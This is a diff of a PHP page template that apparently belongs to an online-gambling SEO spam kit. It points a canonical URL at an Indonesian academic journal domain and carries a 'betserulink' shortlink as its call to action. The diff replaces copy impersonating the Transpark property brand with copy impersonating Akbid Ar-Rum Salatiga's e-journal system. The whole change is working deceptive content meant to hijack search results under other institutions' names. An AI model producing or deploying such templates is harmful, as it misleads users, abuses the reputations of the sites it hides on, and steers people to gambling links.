@@ -44,14 +44,14 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://tamuramah.site/id/$dashbrand";
-$canonical = "https://www.transpark.co.id/assets/$dashbrand";
+$canonical = "https://e-journal.ar-rum.ac.id/js/$dashbrand";
 $cta = "https://t.ly/betserulink";
 $gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729350835/OIG2.9KnXY7KcTQ0v.6SoL86G_h6bile.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Layanan Umum Transpark Official Center";
-$desc = "Transpark Studio adalah sebuah kawasan terpadu yang menggabungkan hunian modern, pusat perbelanjaan, dan hiburan yang dikembangkan oleh Trans Property, bagian dari CT Corp. Berlokasi di beberapa kota besar di Indonesia, Transpark Studio menawarkan konsep $namabrand yang memadukan apartemen, hotel, pusat perbelanjaan, dan berbagai fasilitas hiburan, termasuk taman bermain indoor dan bioskop.";
-$konten = "Transpark Studio adalah sebuah kawasan terpadu yang menggabungkan hunian modern, pusat perbelanjaan, dan hiburan yang dikembangkan oleh Trans Property, bagian dari CT Corp. Berlokasi di beberapa kota besar di Indonesia, Transpark Studio menawarkan konsep $namabrand yang memadukan apartemen, hotel, pusat perbelanjaan, dan berbagai fasilitas hiburan, termasuk taman bermain indoor dan bioskop.";
+$judul = "$namabrand E-Journal Akbid Ar-Rum Salatiga 2024";
+$desc = "Akbid Ar-Rum memiliki sistem belajar online atau biasa dikenal dengan jurnal elektronik yang biasa dipublish melalui sistem yang bernama OJS atau disebut open jurnal system yang dipakai oleh setiap pelajar untuk mencari berbagai contoh jurnal $namabrand dari jurusannya masing-masing secara gratis.";
+$konten = "Akbid Ar-Rum memiliki sistem belajar online atau biasa dikenal dengan jurnal elektronik yang biasa dipublish melalui sistem yang bernama OJS atau disebut open jurnal system yang dipakai oleh setiap pelajar untuk mencari berbagai contoh jurnal $namabrand dari jurusannya masing-masing secara gratis.";
 ?>
 
 
